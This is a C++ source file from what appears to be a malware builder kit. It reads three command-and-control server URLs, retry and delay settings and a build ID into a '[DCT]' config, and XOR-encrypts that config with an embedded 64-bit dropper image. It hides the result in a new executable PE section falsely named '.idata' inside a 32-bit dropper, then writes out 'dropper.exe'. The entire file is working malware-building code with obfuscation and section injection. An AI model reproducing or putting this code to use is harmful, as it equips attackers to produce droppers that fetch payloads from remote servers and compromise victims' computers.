#include <windows.h>
#include <shlwapi.h>

#include "defines.h"
#include "builddropper.h"
#include "tools.h"
#include "languages.h"
#include "activation.h"
#include "..\common\config.h"
namespace Dropper32Hex
{
#include "dropper32.h"
}
namespace Dropper64Hex
{
#include "dropper64.h"
}
#include "..\common\mem.h"
#include "..\common\str.h"
#include "..\common\crypt.h"

#include "..\common\peimage.h"
#include "..\common\fs.h"
#include "..\common\gui.h"

#include "..\common\config.h"

void BuildDropper::init(void)
{

}

void BuildDropper::uninit(void)
{

}

#define SECCFG_SECTION_NAME	".idata"
#define CRYPT_KEY char rc4key[] = "dDjquW83@3eFmzp";
#define RtlOffsetToPointer(B,O) ((PCHAR)(((PCHAR)(B)) + ((ULONG_PTR)(O))))
#define MAKE_PTR(B, O, T) ((T)RtlOffsetToPointer(B, O))

typedef struct _SECTION_CONFIG_RAW
{
	DWORD XorKey;
	DWORD ConfigSize;
	DWORD ImageSize;
}
SECTION_CONFIG_RAW, *PSECTION_CONFIG_RAW;

typedef struct _SECTION_CONFIG
{
	SECTION_CONFIG_RAW Raw;
	PCHAR Name;
	PVOID Config;
	PVOID Image;
}
SECTION_CONFIG, *PSECTION_CONFIG;

PIMAGE_SECTION_HEADER GetVirtualyLastSectionHeader(PIMAGE_NT_HEADERS NtHeaders)
{
	PIMAGE_SECTION_HEADER pFirstSection = IMAGE_FIRST_SECTION(NtHeaders);

	return &pFirstSection[NtHeaders->FileHeader.NumberOfSections - 1];
}

PIMAGE_SECTION_HEADER GetPhysicalyLastSectionHeader(PIMAGE_NT_HEADERS NtHeaders)
{
	PIMAGE_SECTION_HEADER FirstSection = IMAGE_FIRST_SECTION(NtHeaders);
	PIMAGE_SECTION_HEADER LastSection = FirstSection;

	if (1 == NtHeaders->FileHeader.NumberOfSections) return LastSection;

	for	(WORD i = 0; i < NtHeaders->FileHeader.NumberOfSections; ++i)
	{
		if (LastSection->PointerToRawData < FirstSection->PointerToRawData) 
		{
			LastSection = FirstSection;
		}

		++FirstSection;
	}

	return LastSection;
}

DWORD_PTR FreeSpaceInHeader(PVOID ImageBase, PIMAGE_NT_HEADERS NtHeaders)
{
	PIMAGE_SECTION_HEADER FirstSection = IMAGE_FIRST_SECTION(NtHeaders);

	return (FirstSection->PointerToRawData - ((DWORD_PTR)FirstSection - (DWORD_PTR)ImageBase) - (NtHeaders->FileHeader.NumberOfSections * IMAGE_SIZEOF_SECTION_HEADER));
}

PIMAGE_NT_HEADERS PeImageNtHeader(PVOID ImageBase)
{
	PIMAGE_DOS_HEADER ImageDosHeaders = (PIMAGE_DOS_HEADER)ImageBase;
	PIMAGE_NT_HEADERS ImageNtHeaders = NULL;

	if (ImageDosHeaders->e_magic == IMAGE_DOS_SIGNATURE)
	{
		ImageNtHeaders = MAKE_PTR(ImageBase, ImageDosHeaders->e_lfanew, PIMAGE_NT_HEADERS);
		if (ImageNtHeaders->Signature == IMAGE_NT_SIGNATURE)
		{
			return ImageNtHeaders;
		}
	}

	return NULL;
}

BOOLEAN InsertSection(PCHAR SectionName, PVOID Data, DWORD DataSize, PVOID Image, DWORD ImageSize, PVOID *ResultImage, DWORD *ResultImageSize, BOOLEAN VA)
{
	BOOLEAN Result = FALSE;

	do 
	{
		if (Str::_LengthA(SectionName) >= IMAGE_SIZEOF_SHORT_NAME) break;

		PIMAGE_NT_HEADERS NtHeaders = PeImageNtHeader(Image);
		if (!NtHeaders) break;

		DWORD FileAlignment;
		if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) FileAlignment = ((PIMAGE_NT_HEADERS64)NtHeaders)->OptionalHeader.FileAlignment;
		if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) FileAlignment = ((PIMAGE_NT_HEADERS32)NtHeaders)->OptionalHeader.FileAlignment;

		DWORD SectionAlignment;
		if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) SectionAlignment = ((PIMAGE_NT_HEADERS64)NtHeaders)->OptionalHeader.SectionAlignment;
		if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) SectionAlignment = ((PIMAGE_NT_HEADERS32)NtHeaders)->OptionalHeader.SectionAlignment;

		if (FreeSpaceInHeader(Image, NtHeaders) < IMAGE_SIZEOF_SECTION_HEADER) break;

		IMAGE_SECTION_HEADER NewSectionHeader;
		Mem::_zero(&NewSectionHeader, sizeof(IMAGE_SECTION_HEADER));

		Str::_CopyA((PCHAR)NewSectionHeader.Name, SectionName, 7);
		NewSectionHeader.Characteristics = IMAGE_SCN_CNT_CODE|IMAGE_SCN_MEM_READ|IMAGE_SCN_MEM_EXECUTE|IMAGE_SCN_MEM_WRITE;

		NewSectionHeader.SizeOfRawData = ALIGN_UP(DataSize, FileAlignment);
		NewSectionHeader.Misc.VirtualSize = ALIGN_UP(DataSize, SectionAlignment);

		PIMAGE_SECTION_HEADER SectionHeader;

		SectionHeader = GetPhysicalyLastSectionHeader(NtHeaders);
		NewSectionHeader.PointerToRawData = SectionHeader->PointerToRawData + ALIGN_UP(SectionHeader->SizeOfRawData, FileAlignment);

		SectionHeader = GetVirtualyLastSectionHeader(NtHeaders);
		NewSectionHeader.VirtualAddress = SectionHeader->VirtualAddress + ALIGN_UP(SectionHeader->Misc.VirtualSize, SectionAlignment);

		if (VA)
		{
			*ResultImageSize = NewSectionHeader.VirtualAddress + NewSectionHeader.Misc.VirtualSize;
		}
		else
		{
			*ResultImageSize = NewSectionHeader.PointerToRawData + NewSectionHeader.SizeOfRawData;
		}

		*ResultImage = VirtualAlloc(NULL, *ResultImageSize, MEM_RESERVE|MEM_COMMIT, PAGE_EXECUTE_READWRITE);
		if (!*ResultImage) break;

		Mem::_copy(*ResultImage, Image, ImageSize);

		NtHeaders = PeImageNtHeader(*ResultImage);
		SectionHeader = GetVirtualyLastSectionHeader(NtHeaders);
		*(&SectionHeader[1]) = NewSectionHeader;
		++(NtHeaders->FileHeader.NumberOfSections);

		if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) ((PIMAGE_NT_HEADERS64)NtHeaders)->OptionalHeader.SizeOfImage += NewSectionHeader.Misc.VirtualSize;
		if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) ((PIMAGE_NT_HEADERS32)NtHeaders)->OptionalHeader.SizeOfImage += NewSectionHeader.Misc.VirtualSize;

		if (VA)
		{
			Mem::_copy(RtlOffsetToPointer(*ResultImage, NewSectionHeader.VirtualAddress), Data, DataSize);
		}
		else
		{
			Mem::_copy(RtlOffsetToPointer(*ResultImage, NewSectionHeader.PointerToRawData), Data, DataSize);
		}

		if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) ((PIMAGE_NT_HEADERS64)NtHeaders)->OptionalHeader.CheckSum = 0;
		if (NtHeaders->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) ((PIMAGE_NT_HEADERS32)NtHeaders)->OptionalHeader.CheckSum = 0;

		Result = TRUE;
	}
	while (FALSE);

	return Result;
}

VOID _inline XorCrypt(PVOID source, DWORD size, DWORD key)
{
	register LPBYTE src = (LPBYTE)source;
	for(register int i=0; i<size; i++)
	{
		src[i] ^= key % (i+1);
	}
}

BOOLEAN InsertSectionConfig(PSECTION_CONFIG SectionConfig, PVOID Image, DWORD ImageSize, PVOID *ResultImage, DWORD *ResultImageSize, BOOLEAN VA)
{
	BOOLEAN Result = FALSE;
	DWORD DataSize;
	PVOID Data;

	DataSize = sizeof(SECTION_CONFIG_RAW) + SectionConfig->Raw.ConfigSize + SectionConfig->Raw.ImageSize;
	Data = Mem::alloc(DataSize);
	if (Data)
	{
		Mem::_copy(Data, &SectionConfig->Raw, sizeof(SECTION_CONFIG_RAW));

		Mem::_copy(RtlOffsetToPointer(Data, sizeof(SECTION_CONFIG_RAW)), SectionConfig->Config, SectionConfig->Raw.ConfigSize);
		Mem::_copy(RtlOffsetToPointer(Data, sizeof(SECTION_CONFIG_RAW) + SectionConfig->Raw.ConfigSize), SectionConfig->Image, SectionConfig->Raw.ImageSize);
		XorCrypt(RtlOffsetToPointer(Data, sizeof(SECTION_CONFIG_RAW)), SectionConfig->Raw.ConfigSize + SectionConfig->Raw.ImageSize, SectionConfig->Raw.XorKey);

		Result = InsertSection(SectionConfig->Name, Data, DataSize, Image, ImageSize, ResultImage, ResultImageSize, VA);

		Mem::free(Data);
	}
	/*MiniStorage::STORAGE* st = MiniStorage::_createEmpty();
	MiniStorage::_addItemAsUtf8StringA(&st, MiniStorage::ID_CONFIG_TXT, MiniStorage::ITEMF_COMBINE_OVERWRITE|MiniStorage::ITEMF_IS_SETTING, (LPSTR)SectionConfig->Config);
	MiniStorage::_addItem(&st, MiniStorage::ID_DROPPER_PE, MiniStorage::ITEMF_COMBINE_OVERWRITE|MiniStorage::ITEMF_IS_PE_FILE, Image, ImageSize);
	Result = PeLdr::InsertSection(SectionConfig->Name, st, st->size, Image, ImageSize, ResultImage, ResultImageSize, VA);*/

	return Result;
}

static bool BuildDropper1(LPSTR Data, HWND output)
{
	BOOL bOk = FALSE;
	PVOID Dropper32Image;
	DWORD_PTR Dropper32ImageSize;
	SECTION_CONFIG SectionConfig;

	SectionConfig.Name = SECCFG_SECTION_NAME;
	SectionConfig.Config = (PVOID)Data;
	SectionConfig.Raw.XorKey = Crypt::mtRand();
	SectionConfig.Raw.ConfigSize = Str::_LengthA(Data)+1;
	writeOutput(output, L"Xor key: 0x%X", SectionConfig.Raw.XorKey);

	SectionConfig.Image = (LPBYTE)Dropper64Hex::dropperfile64;
	SectionConfig.Raw.ImageSize = sizeof(Dropper64Hex::dropperfile64);

	/*MiniStorage::STORAGE* st;
	st = MiniStorage::_createEmpty();
	CRYPT_KEY
	DWORD r = 0;
	if(!MiniStorage::_addItemAsUtf8StringA(&st, MiniStorage::ID_CONFIG_TXT, MiniStorage::ITEMF_IS_SETTING, Data)
		|| !MiniStorage::_addItem(&st, MiniStorage::ID_DROPPER_PE, MiniStorage::ITEMF_IS_PE_FILE, (LPVOID)Dropper64Hex::dropperfile64, sizeof(Dropper64Hex::dropperfile64))
		|| (r=MiniStorage::_pack(&st, MiniStorage::PACKF_FINAL_MODE, rc4key)))
	{
		return false;
	}
	*/
	
	//if (InsertSectionConfig(st, r, (PVOID)Dropper32Hex::dropperfile32, sizeof(Dropper32Hex::dropperfile32), &Dropper32Image, &Dropper32ImageSize, FALSE))
	if (InsertSectionConfig(&SectionConfig, (PVOID)Dropper32Hex::dropperfile32, sizeof(Dropper32Hex::dropperfile32), &Dropper32Image, &Dropper32ImageSize, FALSE))
	{
		PeImage::createNtCheckSum((LPBYTE)Dropper32Image, Dropper32ImageSize);
		bOk = Fs::_saveToFile(L"dropper.exe", Dropper32Image, Dropper32ImageSize);
	}

	return bOk;
}

bool BuildDropper::_run(HWND owner, HWND output, Config0::CFGDATA *config, LPWSTR destFolder)
{
	Config0::VAR *rootNode;
	Config0::VAR *currentNode;
	
	CHAR Url1[260];
	CHAR Url2[260];
	CHAR Url3[260];
	CHAR Delay[20];
	CHAR Retry[20];
	CHAR Build[100];
	Mem::_zero(Url1, sizeof(Url1));
	Mem::_zero(Url2, sizeof(Url2));
	Mem::_zero(Url3, sizeof(Url3));
	Mem::_zero(Delay, sizeof(Delay));
	Mem::_zero(Retry, sizeof(Retry));
	Mem::_zero(Build, sizeof(Build));

	writeOutput(output, Languages::get(Languages::builder_bot_proc_creating));
	
	//Open configuration
	if((rootNode = Config0::_GetVar(NULL, config, NULL, "DropperConfig")) == NULL)
	{
		writeOutputError(output, Languages::get(Languages::builder_dropperconfig_not_founded));
		return false;
	}

	//Url1
	{
		DWORD valueSize = 0;
		if((currentNode = Config0::_GetVar(rootNode, NULL, "url1", NULL)) == NULL || currentNode->bValuesCount < 2 || (valueSize = Str::_LengthA(currentNode->pValues[1])) > 260)
		{
			writeOutputError(output, Languages::get(Languages::builder_dropperconfig_url1_error));
			return false;
		}
		Str::_CopyA(Url1, currentNode->pValues[1], valueSize);
		writeOutput(output, L"url1=OK");
	}

	//Url2
	{
		DWORD valueSize = 0;
		if((currentNode = Config0::_GetVar(rootNode, NULL, "url2", NULL)) == NULL || currentNode->bValuesCount < 2 || (valueSize = Str::_LengthA(currentNode->pValues[1])) > 260)
		{
			writeOutputError(output, Languages::get(Languages::builder_dropperconfig_url2_error));
			return false;
		}
		Str::_CopyA(Url2, currentNode->pValues[1], valueSize);
		writeOutput(output, L"url2=OK");
	}

	//Url3
	{
		DWORD valueSize = 0;
		if((currentNode = Config0::_GetVar(rootNode, NULL, "url3", NULL)) == NULL || currentNode->bValuesCount < 2 || (valueSize = Str::_LengthA(currentNode->pValues[1])) > 260)
		{
			writeOutputError(output, Languages::get(Languages::builder_dropperconfig_url3_error));
			return false;
		}
		Str::_CopyA(Url3, currentNode->pValues[1], valueSize);
		writeOutput(output, L"url3=OK");
	}

	//Delay
	{
		DWORD valueSize = 0;
		if((currentNode = Config0::_GetVar(rootNode, NULL, "delay", NULL)) == NULL || currentNode->bValuesCount < 2 || (valueSize = Str::_LengthA(currentNode->pValues[1])) > 20)
		{
			writeOutputError(output, Languages::get(Languages::builder_dropperconfig_delay_error));
			return false;
		}
		Str::_CopyA(Delay, currentNode->pValues[1], valueSize);
		writeOutput(output, L"delay=OK");
	}

	//Retry
	{
		DWORD valueSize = 0;
		if((currentNode = Config0::_GetVar(rootNode, NULL, "retry", NULL)) == NULL || currentNode->bValuesCount < 2 || (valueSize = Str::_LengthA(currentNode->pValues[1])) > 20)
		{
			writeOutputError(output, Languages::get(Languages::builder_dropperconfig_retry_error));
			return false;
		}
		Str::_CopyA(Retry, currentNode->pValues[1], valueSize);
		writeOutput(output, L"retry=OK");
	}

	//BuildId
	{
		DWORD valueSize = 0;
		if((currentNode = Config0::_GetVar(rootNode, NULL, "buildid", NULL)) == NULL || currentNode->bValuesCount < 2 || (valueSize = Str::_LengthA(currentNode->pValues[1])) > 100)
		{
			writeOutputError(output, Languages::get(Languages::builder_dropperconfig_buildid_error));
			return false;
		}
		Str::_CopyA(Build, currentNode->pValues[1], valueSize);
		writeOutput(output, L"buildid=OK");
	}

	CHAR CreatedConfig[1024];
	if(Str::_sprintfA(CreatedConfig, 1024, "[DCT]\r\nsrvurls=%s;%s;%s\r\nsrvdelay=%s\r\nsrvretry=%s\r\nbuildid=%s\r\nfpicptr=%s\r\n", Url1, Url2, Url3, Delay, Retry, Build, "GetKeyboardLayoutList") == (DWORD)-1)
	{
		writeOutput(output, L"Can't create dropper config.");
		return false;
	}

	if(BuildDropper1(CreatedConfig, output)) writeOutput(output, Languages::get(Languages::builder_dropper_success));
	else writeOutput(output, Languages::get(Languages::builder_dropper_error));

	writeOutput(output, Languages::get(Languages::builder_bot_proc_end));
	return true;
}